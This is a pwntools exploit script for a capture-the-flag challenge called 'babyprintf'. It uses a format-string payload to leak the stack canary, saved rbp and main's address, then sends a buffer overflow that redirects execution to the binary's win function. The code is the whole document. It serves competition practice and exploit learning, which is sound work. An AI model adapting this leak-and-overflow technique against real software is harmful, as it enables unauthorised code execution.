#!/usr/bin/env python3

from pwn import *
#for this to work, you need the given libc (libc.so.6) and library (ld-linux-x86-64.so.2), as long as the executable
#pwninit template
elf = ELF("./babyprintf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("baby-printf.challs.olicyber.it", 34004)
    else:
        r = gdb.debug('./babyprintf_patched', env={'FLAG':'flag'}, gdbscript='''
              b main 
              continue''')
    return r


def main():
    r = conn()

    r.recvuntil(b'back:\n')
    r.sendline(b'%11$p|%12$p|%15$p') # Leak canary, rbp and main address

    canary = int(r.recvuntil(b'|')[:-1].strip(), 16)
    rbp = int(r.recvuntil(b'|')[:-1].strip(), 16)
    main = int(r.recvline().strip(), 16)
    print(f"Canary: {hex(canary)}")
    print(f"rbp: {hex(rbp)}")
    print(f"main address: {hex(main)}")

    elf.address = main - elf.sym['main']
    print(f"elf base: {hex(elf.address)}")

    r.sendline(b'!q' + b'A'*38 + p64(canary) + p64(rbp) + p64(elf.sym['win']))
    r.interactive()
    r.close()


if __name__ == "__main__":
    main()
